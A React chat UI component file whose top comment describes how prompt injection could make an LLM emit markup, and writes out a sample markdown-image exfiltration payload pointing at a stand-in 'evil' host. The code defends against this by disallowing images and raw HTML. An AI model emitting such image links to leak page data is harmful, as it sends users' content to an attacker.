import { cn } from 'cnfast';
import {
  useEffect,
  useRef,
  type ComponentProps,
  type KeyboardEvent,
  type ReactNode,
  type Ref
} from 'react';
import { Wrench } from 'lucide-react';
import Markdown, { type Components } from 'react-markdown';
import remarkBreaks from 'remark-breaks';
import remarkGfm from 'remark-gfm';
import { Button } from './Button';
import { Select } from './Select';
import { Toolbar } from './Toolbar';

// Assistant messages come from an LLM, which an attacker can steer via prompt
// injection to have "generate" markup of its choosing -- so this renders a
// deliberately narrow subset. No raw HTML (react-markdown never parses it
// without rehype-raw, so it's shown as escaped text) and no images (blocks
// the classic markdown-image exfiltration channel: an attacker-controlled
// `![x](https://evil/log?d=...)` that auto-fires a GET with page content in
// the query string the moment it renders, no click required). Links stay
// allowed, but react-markdown's `defaultUrlTransform` already strips
// non-http(s)/mailto schemes (`javascript:`, `data:`, ...) before they reach
// the DOM.
const ASSISTANT_MARKDOWN_ELEMENTS = [
  'p',
  'strong',
  'em',
  'del',
  'code',
  'pre',
  'ul',
  'ol',
  'li',
  'blockquote',
  'a',
  'br',
  'h1',
  'h2',
  'h3',
  'h4',
  'hr',
  'table',
  'thead',
  'tbody',
  'tr',
  'th',
  'td'
];

const assistantMarkdownComponents: Components = {
  a: ({ href, children, ...rest }) => (
    <a href={href} target="_blank" rel="noopener noreferrer nofollow" {...rest}>
      {children}
    </a>
  )
};

export function ChatRoot({ className, ...props }: ComponentProps<'div'>) {
  return <div className={cn('flex min-h-0 flex-1 flex-col bg-surface-2', className)} {...props} />;
}

export function ChatMessageContainer({ className, ...props }: ComponentProps<'div'>) {
  return (
    <div
      className={cn(
        'flex min-h-0 flex-1 select-text flex-col gap-2 overflow-y-auto px-3 py-3',
        className
      )}
      {...props}
    />
  );
}

export function ChatUserMessage({ className, children, ...props }: ComponentProps<'div'>) {
  return (
    <div className={cn('flex justify-end', className)} {...props}>
      <div className="max-w-[85%] rounded-lg bg-accent px-3 py-2 text-sm whitespace-pre-wrap text-emphasis-text">
        {children}
      </div>
    </div>
  );
}

interface ChatAssistantMessageProps extends Omit<ComponentProps<'div'>, 'children'> {
  children: string;
}

export function ChatAssistantMessage({ className, children, ...props }: ChatAssistantMessageProps) {
  return (
    <div className={cn('flex justify-start', className)} {...props}>
      <div
        className={cn(
          'px-3 py-2 text-foreground',
          '[&>*+*]:mt-2',
          '[&_ul]:list-disc [&_ol]:list-decimal [&_ul]:pl-5 [&_ol]:pl-5',
          '[&_blockquote]:border-l-2 [&_blockquote]:border-border-dark [&_blockquote]:pl-2 [&_blockquote]:text-muted-foreground',
          '[&_a]:text-accent [&_a]:underline',
          '[&_code]:rounded [&_code]:bg-surface-3 [&_code]:px-1 [&_code]:py-0.5 [&_code]:text-sm',
          '[&_pre]:overflow-x-auto [&_pre]:rounded [&_pre]:bg-surface-3 [&_pre]:p-2 [&_pre]:text-sm',
          '[&_pre_code]:bg-transparent [&_pre_code]:p-0',
          '[&_h1]:text-base [&_h1]:font-semibold [&_h2]:font-semibold [&_h3]:font-semibold',
          '[&_table]:block [&_table]:w-max [&_table]:max-w-full [&_table]:overflow-x-auto [&_table]:border-collapse',
          '[&_th]:border [&_th]:border-border-dark [&_th]:px-2 [&_th]:py-1 [&_th]:text-left [&_th]:font-medium',
          '[&_td]:border [&_td]:border-border-dark [&_td]:px-2 [&_td]:py-1'
        )}
      >
        <Markdown
          remarkPlugins={[remarkGfm, remarkBreaks]}
          allowedElements={ASSISTANT_MARKDOWN_ELEMENTS}
          unwrapDisallowed
          components={assistantMarkdownComponents}
        >
          {children}
        </Markdown>
      </div>
    </div>
  );
}

export function ChatThinking({ className, ...props }: ComponentProps<'div'>) {
  return (
    <div className={cn('flex justify-start', className)} {...props}>
      <div className="flex items-center gap-1 rounded-lg bg-surface-2 px-3 py-2.5">
        <span className="size-1.5 animate-bounce rounded-full bg-muted-foreground [animation-delay:-0.3s]" />
        <span className="size-1.5 animate-bounce rounded-full bg-muted-foreground [animation-delay:-0.15s]" />
        <span className="size-1.5 animate-bounce rounded-full bg-muted-foreground" />
      </div>
    </div>
  );
}

export type ChatPermissionStatus = 'pending' | 'running' | 'approved' | 'denied';

interface ChatPermissionRequestProps {
  children: ReactNode;
  status: ChatPermissionStatus;
  onApprove: () => void;
  onDeny: () => void;
  className?: string;
}

export function ChatPermissionRequest({
  children,
  status,
  onApprove,
  onDeny,
  className
}: ChatPermissionRequestProps) {
  return (
    <div
      className={cn(
        'flex flex-col gap-2 rounded-lg border border-border-dark bg-surface-2 px-3 py-2 text-sm',
        className
      )}
    >
      <span className="text-foreground">{children}</span>
      {status === 'pending' && (
        <div className="flex gap-2">
          <Button size="sm" variant="primary" onClick={onApprove}>
            Allow
          </Button>
          <Button size="sm" variant="secondary" onClick={onDeny}>
            Deny
          </Button>
        </div>
      )}
      {status === 'running' && <span className="text-muted-foreground">Running…</span>}
      {status === 'approved' && <span className="text-emerald-400">Allowed</span>}
      {status === 'denied' && <span className="text-red-400">Denied</span>}
    </div>
  );
}

export function ChatToolCall({ className, children, ...props }: ComponentProps<'div'>) {
  return (
    <div className={cn('flex justify-start', className)} {...props}>
      <div className="flex items-center gap-1.5 rounded-lg bg-surface-2 px-3 py-2 text-sm text-muted-foreground">
        <Wrench className="size-3.5 shrink-0" />
        <span>{children}</span>
      </div>
    </div>
  );
}

export interface ChatModelOption {
  id: string;
  label: string;
}

interface ChatInputProps extends Omit<ComponentProps<'textarea'>, 'value'> {
  value: string;
  onSend: () => void;
  loading?: boolean;
  ref?: Ref<HTMLTextAreaElement>;
  containerClassName?: string;
  models?: ChatModelOption[];
  modelId?: string | null;
  onModelChange?: (id: string) => void;
  tokens?: number | null;
  cost?: number | null;
  /** Current conversation size, in tokens -- distinct from `tokens` (the session's cumulative usage). */
  contextTokens?: number | null;
  /** Model's max input+output tokens; paired with `contextTokens` to render a usage percentage. */
  contextWindow?: number | null;
}

export function ChatInput({
  className,
  containerClassName,
  value,
  onSend,
  loading = false,
  rows = 1,
  ref,
  onKeyDown,
  models = [],
  modelId,
  onModelChange,
  tokens,
  cost,
  contextTokens,
  contextWindow,
  ...props
}: ChatInputProps) {
  const contextPct = contextTokens != null && contextWindow ? contextTokens / contextWindow : null;
  const sendDisabled = loading || !value.trim();
  const textareaRef = useRef<HTMLTextAreaElement | null>(null);

  useEffect(() => {
    const el = textareaRef.current;
    if (!el) return;
    el.style.height = 'auto';
    el.style.height = `${el.scrollHeight}px`;
  }, [value]);

  function setRefs(node: HTMLTextAreaElement | null) {
    textareaRef.current = node;
    if (typeof ref === 'function') ref(node);
    else if (ref) ref.current = node;
  }

  function handleKeyDown(e: KeyboardEvent<HTMLTextAreaElement>) {
    onKeyDown?.(e);
    if (e.defaultPrevented) return;
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      if (!sendDisabled) onSend();
    }
  }

  return (
    <div className="m-4 border border-border shadow">
      <div className={cn('flex flex-col', containerClassName)}>
        <textarea
          ref={setRefs}
          rows={rows}
          value={value}
          onKeyDown={handleKeyDown}
          className={cn(
            'max-h-40 resize-none overflow-y-auto p-3 bg-surface',
            'text-foreground focus-visible:outline-none disabled:opacity-50',
            className
          )}
          {...props}
        />
        <Toolbar.Root className="border-t border-b-0 border-border">
          <div className="h-9">
            {models.length > 0 && (
              <Select.Root
                value={modelId ?? null}
                onValueChange={(v) => onModelChange?.(v as string)}
              >
                <Select.Trigger
                  variant="ghost"
                  size="sm"
                  className="h-full rounded-none px-3 text-sm"
                >
                  <Select.Value placeholder="Select model" />
                </Select.Trigger>
                <Select.Content align="start">
                  {models.map((model) => (
                    <Select.Item key={model.id} value={model.id}>
                      {model.label}
                    </Select.Item>
                  ))}
                </Select.Content>
              </Select.Root>
            )}
          </div>
          {contextPct != null && (
            <span
              className={cn(
                'h-full flex items-center px-3 text-sm tabular-nums',
                contextPct >= 0.9
                  ? 'text-red-400'
                  : contextPct >= 0.7
                    ? 'text-amber-400'
                    : 'text-muted-foreground'
              )}
              title={`${contextTokens!.toLocaleString()} / ${contextWindow!.toLocaleString()} context tokens used`}
            >
              {Math.round(contextPct * 100)}% context
            </span>
          )}
          {tokens != null && (
            <span className="h-full flex items-center px-3 text-sm text-muted-foreground tabular-nums">
              {tokens.toLocaleString()} tokens
            </span>
          )}
          {cost != null && (
            <span className="h-full flex items-center px-3 text-sm text-muted-foreground tabular-nums">
              ${cost.toFixed(4)}
            </span>
          )}
          <div className="grow bg-diagonal-stripes h-full" />
          <Toolbar.Button variant="primary" onClick={onSend} disabled={sendDisabled}>
            Send
          </Toolbar.Button>
        </Toolbar.Root>
      </div>
    </div>
  );
}

// eslint-disable-next-line react-refresh/only-export-components
export const Chat = {
  Root: ChatRoot,
  MessageContainer: ChatMessageContainer,
  UserMessage: ChatUserMessage,
  AssistantMessage: ChatAssistantMessage,
  Thinking: ChatThinking,
  PermissionRequest: ChatPermissionRequest,
  ToolCall: ChatToolCall,
  Input: ChatInput
};
